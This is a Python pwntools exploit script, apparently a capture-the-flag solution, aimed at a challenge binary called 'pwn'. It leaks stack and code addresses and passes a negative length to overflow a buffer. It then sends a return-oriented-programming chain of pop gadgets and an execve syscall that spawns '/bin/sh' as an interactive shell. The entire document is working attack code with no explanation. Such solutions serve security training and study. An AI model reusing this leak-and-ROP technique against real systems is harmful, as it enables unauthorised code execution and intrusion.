from urllib.parse import ParseResultBytes
from pwn import *

context.log_level = 'debug'
#p = remote('121.4.118.92',9336)
p = process('./pwn')
gdb.attach(p,"b restore")

p.recvuntil("Are you ready?\n")
p.sendline("yes")

# 1 func1
p.recvuntil("len:\n")
p.sendline(str(16))
p.recvuntil("input:\n")
p.send('a'*0x10)
p.recvuntil('a'*0x10)

leak = u64(p.recv(6).ljust(8,b'\x00')) #stack
log.info("leak = "+hex(leak))
fake_stack = leak + 0x60 
fake_rip = leak + 0x60

rsp = leak + 0x1000 - 0x1050
rbp = leak + 0x1000 - 0x1030
target_rip = leak + 0x1000 + 8

# 1 func2
p.recvuntil("len:\n")
p.sendline(str(-0x7FFFFFFFFFFFE000))
p.recvuntil("input:\n")
payload = ""
payload += (0xc0-0x40)*'b'
payload += 'c'*8
payload += 'c'*8
p.send(payload)

p.recvuntil('c'*16)
text = u64(p.recv(6).ljust(8,b'\x00'))
textbase = text - 0x236 - 0x10

log.info('leak text = '+hex(text))
log.info('text base = '+hex(textbase))

pop_rax_ret = textbase + 0x21c
pop_rdi_ret = textbase + 0x218
pop_rsi_ret = textbase + 0x21a
pop_rdx_ret = textbase + 0x216
syscall = textbase + 0x214
ret = textbase + 0x01a

fake_rsp = leak + 0x1000 # -->pop_rdx_ret
fake_rbp = leak + 0x1000
sh =leak + 0x50 + 0x1000

# 2 func2
#0x5574946b82c0:	0x00005574946b71f0	0x00005574946b7210
p.recvuntil("input:\n")
payload = b""
payload += b'd'*8   # in restore : mov    qword ptr [rsp], rdx  --> ret
payload += p64(pop_rdi_ret) + p64(sh)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59) 
payload += p64(syscall)
payload += b"/bin/sh\x00"
payload = payload.ljust(0x80,b'a')
payload += p64(rsp)
payload += p64(rbp)
payload += p64(ret) # --> pop_rdi_ret
p.send(payload)

# 3 func2
p.recvuntil("input:\n")
payload = b"" 
payload += b'd'*8   #  in restore : mov    qword ptr [rsp], rdx  --> ret
payload += p64(pop_rdi_ret) + p64(sh)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall)
payload += b"/bin/sh\x00"
payload = payload.ljust(0x80,b'a')
payload += p64(fake_rsp)
payload += p64(fake_rbp)
payload += p64(ret)
p.send(payload)


p.interactive()
